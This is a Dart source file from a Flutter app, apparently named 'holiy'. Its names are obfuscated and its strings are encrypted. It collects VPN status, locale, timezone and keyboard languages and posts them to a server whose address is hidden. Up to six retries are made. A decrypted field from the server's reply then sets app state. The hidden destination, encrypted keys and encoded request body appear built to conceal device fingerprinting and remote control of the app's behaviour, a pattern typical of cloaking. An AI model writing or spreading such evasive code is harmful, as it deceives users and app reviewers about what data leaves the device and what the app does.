import 'dart:convert';
import 'package:devicelocale/devicelocale.dart';
import 'package:flutter_native_timezone/flutter_native_timezone.dart';
import 'package:holiy/ledemplieihou/asemblerapide.dart';
import 'package:holiy/ledemplieihou/battementfrappe.dart';
import 'package:holiy/ledemplieihou/piepointesdsjia.dart';
import 'package:system_keyboard_languages/system_keyboard_languages.dart';
import 'package:vpn_detector/vpn_detector.dart';
import 'package:http/http.dart' as http;

class Menturbelow {
  Future<Map<String, dynamic>> ammangibleox() async {
    int uityctitious = 0;
    List<dynamic> tirpatrvide = [];
    String anxegesiseous = '';
    List<String> ditquipoisee = [];

    try {
      final status = await VpnDetector().isVpnActive();
      uityctitious = status == VpnStatus.active ? 1 : 0;
    } catch (_) {}

    try {
      tirpatrvide = await Devicelocale.preferredLanguages ?? [];
    } catch (_) {}

    try {
      anxegesiseous = await FlutterNativeTimezone.getLocalTimezone();
    } catch (_) {}

    try {
      ditquipoisee = await SystemKeyboardLanguages().languages();
    } catch (_) {}

    return {
      "EMJyYdLU/V2133HY1UiHew==".rvilcurrilouse(): 1,
      "/moHQsULcSlwqFbq8hEL/w==".rvilcurrilouse(): uityctitious,
      "FYDwk5+oYv+UagB+RcwseQ==".rvilcurrilouse(): tirpatrvide,
      "Wqf9mN0kjnRpZislnuixqg==".rvilcurrilouse(): await oupidations(),
      "4zrS9NnWFM0F1P1Jnj5c0Q==".rvilcurrilouse(): anxegesiseous,
      "lII4xaLT/0oj/JNhqFtung==".rvilcurrilouse(): ditquipoisee,
      "lwUKbYRPokJxrqDd2DvdEA==".rvilcurrilouse(): 1,
    };
  }

  Future<Map<String, dynamic>> tempoigencyr() async {
    return {
      'omiasticd': Perturbauousble().cularundiced,
      "ncnigman": Perturbauousble().hoamportunete,
    };
  }

  Future<Map<String, dynamic>> ainteragitious() async {
    return {"nuintreato": "${Perturbauousble().xoraeffableble}"};
  }

  Future<Map<String, dynamic>> giacfulgent(
    String csconceene,
    String endullience,
    dynamic cetoughither,
  ) async {
    return {
      "6aLYqr8p/EEBw/IOjQKfMg==".rvilcurrilouse(): csconceene,
      "je7YD0KY468E9IAYI30O+Q==".rvilcurrilouse(): endullience,
      "7mkalOyU0RdH250pg3PbIg==".rvilcurrilouse(): cetoughither,
    };
  }

  Future<Map<String, dynamic>?> rsivisingenue(
    String rgelatory,
    Map<String, dynamic> ietsconsude,
  ) async {
    final titulderdade = Uri.https('nhJFtAkEHjDJehsu2YEwivx51ura4tS27ecyPaqufZo='.rvilcurrilouse(), rgelatory);

    final t = Perturbauousble();

    final c22D05DfNZ = <String, String>{
      'bdiio9JsgPxC1UQrZoAPuw=='.rvilcurrilouse(): 'DedR6mHxP2KgjtLdq8CDtA8GCgeZvjHgf55r32iK77Q='.rvilcurrilouse(),
      'MYhO3jejh8wtH1dFMWEuew=='.rvilcurrilouse(): Perturbauousble.pugnputmpes,
      'WQHZ6e69agQG6f7cjSJiyw=='.rvilcurrilouse(): t.hoamportunete,
      '0v3SkfcOYuAjTjnN/xZKUw=='.rvilcurrilouse(): t.anterentnsipid,
      '8ajkcLkzwW73QLhGg25V/A=='.rvilcurrilouse(): t.sciblvective,
      'U5B9NDr8pN0oGk1jiQBnRQ=='.rvilcurrilouse(): Perturbauousble.gnomidiosyn,
    };

    try {
      final araliginouspace = jsonEncode(ietsconsude);

      final lithefurcated = await http
          .post(
            titulderdade,
            headers: c22D05DfNZ,
            body: araliginouspace.threxovia(),
          )
          .timeout(const Duration(seconds: 8));

      if (lithefurcated.statusCode != 200) {
        return null;
      }

      if (lithefurcated.body.isEmpty) {
        return null;
      }

      try {
        final decoded = jsonDecode(lithefurcated.body);

        if (decoded is Map<String, dynamic>) {
          return decoded;
        }

        return null;
      } catch (_) {
        return null;
      }
    } catch (_) {
      return null;
    }
  }

  Future<int> aduciromidety() async {
    await rsitudeulent();

    const int harvilothey = 6;
    int pitulaanardte = 0;

    while (pitulaanardte < harvilothey) {
      pitulaanardte++;

      final oratonvivialive = await rsivisingenue(
        'JKTUG4sdWT67VjaB1oCgtQ02N1Tw+wueU8wJNOtvqe8='.rvilcurrilouse(),
        await ammangibleox(),
      );

      print(oratonvivialive);

      if (oratonvivialive == null) {
       
        final delay = 800 + pitulaanardte * 300;
        await Future.delayed(Duration(milliseconds: delay));
        continue;
      }

      if (oratonvivialive['Nlpx/dJJvzsJqK85Zp2Kuw=='.rvilcurrilouse()] == "+VhjhqwGwAtdMFXY40Cvow==".rvilcurrilouse()) {
        try {
          final dauntlesupiditys = jsonDecode(
            oratonvivialive["XhpctzInfOqc1/qsLaF8SQ==".rvilcurrilouse()].toString().glarivex(),
          );

          Perturbauousble().doledefatigab = dauntlesupiditys["p6X/eRWPF12Ouk1ukMOpzA==".rvilcurrilouse()];
          return 1;
        } catch (_) {
          return -1;
        }
      }

      return -1;
    }

    return -1;
  }
}
